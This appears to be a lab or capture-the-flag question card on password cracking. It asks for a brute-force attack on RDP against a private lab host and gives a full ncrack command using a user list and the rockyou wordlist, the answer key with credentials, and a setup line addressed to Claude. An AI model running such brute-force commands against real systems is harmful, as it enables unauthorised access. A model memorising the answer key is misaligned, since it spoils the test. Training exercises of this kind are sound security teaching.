# Q282 — Brute Force RDP Using Ncrack

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.130` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `ncrack` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use Ncrack to brute force RDP on Windows target."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>; tool=ncrack
```

---

## ✅ Solution

```bash
ncrack -vv -U users.txt -P /usr/share/wordlists/rockyou.txt 192.168.52.130:3389
```

**Answer:** `user=admin; password=password123; tool=ncrack`

---

## 🤖 Claude Setup Prompt

Ensure RDP on Win7. Report back: "Lab ready for Q282"
